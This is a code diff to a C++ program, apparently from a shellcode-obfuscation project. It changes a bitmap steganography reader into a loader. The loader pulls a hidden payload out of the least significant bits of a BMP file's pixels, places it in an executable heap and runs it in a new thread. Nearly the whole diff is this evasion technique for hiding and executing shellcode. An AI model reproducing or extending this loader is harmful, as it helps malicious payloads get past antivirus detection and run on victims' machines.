@@ -1,12 +1,17 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <fstream>
-#include <bitset>
+#include <Windows.h>
 
 
 char get_lsb(char target, char source) {
     return (target << 1) | (source & 1);
 }
+
+
+
+const int shellcode_len = 1544;
+char* payload_data = new char[shellcode_len / 8];
 
 
 void ReadBMP(std::string filename)
@@ -40,51 +45,40 @@ void ReadBMP(std::string filename)
    */
 
     int row_length = 4 * ((width + 1) * 3 / 4);
-    
-    char* payload_data;
-    
-    int bits_to_read = 360;
-    int bits_read = 0;
-
     char* row_data = new char[row_length];
-    char r, g, b;
+   
 
-    char temp = 0;
+    int pos = 0;
 
     for (int i = 0; i < height; i++)
     {
         file.read(row_data, row_length);
-        for (int j = 0; j < width * 3; j += 3)
+        for (int j = 0; j < width * 3; j++, pos++)
         {
-            if (bits_to_read) {
-                /*
-                * In binary, pixels are actually stored in reversed format (B, G, R)
-                * https://stackoverflow.com/questions/9296059/read-pixel-value-in-bmp-file/38440684
-                */
-
-
-                b = row_data[j];
-                g = row_data[j + 1];
-                r = row_data[j + 2];
-                
-                temp = get_lsb(temp, r);
-                temp = get_lsb(temp, g);
-                temp = get_lsb(temp, b);
-
-                bits_to_read -= 3;
-            }
-            else {
+            payload_data[pos / 8] = get_lsb(payload_data[pos / 8], row_data[j]);
+            if (pos >= shellcode_len) {
                 file.close();
                 return;
             }
         }
     }
+   
 }
 
 
 int main() {
-    ReadBMP("C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\helpme.bmp");
+    ReadBMP("helpme.bmp");
     // ReadBMP("C:\\Users\\Blackberry\\Desktop\\Untitled.bmp");
     // ReadBMP("output-onlinerandomtools2.bmp");
+
+    LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+    LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
+    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);
+
+
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+
+    
+    getchar();
     return 0;
 }
